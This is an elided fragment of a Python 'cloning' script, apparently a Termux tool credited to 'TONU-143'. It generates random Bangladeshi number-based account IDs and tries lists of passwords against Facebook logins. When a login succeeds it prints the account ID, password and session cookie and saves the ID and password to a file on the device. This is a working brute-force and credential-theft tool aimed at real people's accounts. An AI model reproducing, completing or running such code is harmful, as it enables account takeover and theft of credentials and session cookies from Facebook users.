...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mTONU')
...
os.system('xdg-open https://github.com/Tonu-143')
name=fuckx.upper()

psb('\x1b[1;31mBANGLADESH MEHEDI HASAN TONU CLONING START PLEASE WAIT ..........')
time.sleep(3)
...
|__  $$__//$$__  $$| $$$ | $$| $$  | $$       /$$$$| $$  | $$ /$$__  $$
  ...
  \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33mTONU-143       |
  \033[1;32m|     \033[1;32m[✓] FACEBOK      : \033[1;34m MEHEDI HASAN TONU     |
  \033[1;32m|     \033[1;35m[✓] GITHUB       :  \033[1;35mTONU-143    \033[1;92m|
  \033[1;32m|     \033[1;36m[✓] TOOL STATUS  :  \033[1;36m PAID       \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] TEAM         :  \033[1;35mTONU-143    \033[1;92m|
...
def main():
    ...
    banner()
    print(f' ')
    print(f'{M}╔══[ [•] TOOL NAME : {H}MEHEDI HASAN TONU')
    print(f'{M}║══[ [•] YOR IP    : ')
    ...
    print(f"║══[{H}[{M}5{H}] \033[1;92mRANDOM BD 10 DIGIT {RED}(CHOICE)")
    print(f"║══[{H}[{M}6{H}] \033[1;92mRANDOM BD 11 DIGIT {RED}(CHOICE)")
    print(f"║══[{H}[{M}7{H}] \033[1;92mRANDOM BD 12 DIGIT {RED}(CHOICE)")
    print(f"║══[{H}[{M}8{H}] \033[1;92mRANDOM BD 13 DIGIT {RED}(CHOICE)")
    print(f"║══[{H}[{M}9{H}] \033[1;92mRANDOM BD 14 DIGIT {RED}(CHOICE)")
    ...
    if sh =='1':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100000812025846')
       sh6()
    if sh =='2':
       os.system('xdg-open https://www.facebook.com/profile.php?id=100000812025846')
       sh7()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio HASAN_OK.mp3")
                print('    \033[1;92m[TONU-OK] '+uid+' | '+ps+'\033[0;97m')
                print(f'    {B}[NUMBER📳] {K}'+uid+'  ')
                print(f'    {B}[COOKI💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/TONU-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mTONU","\x1b[1;92mTONU","\x1b[1;93mTONU","\x1b[1;94mTONU","\x1b[1;95mTONU","\x1b[1;96mTONU","\x1b[1;97mTONU","\x1b[1;91mTONU","\x1b[1;92mTONU","\x1b[1;93mTONU","\x1b[1;94mTONU","\x1b[1;95mTONU","\x1b[1;96mTONU"])
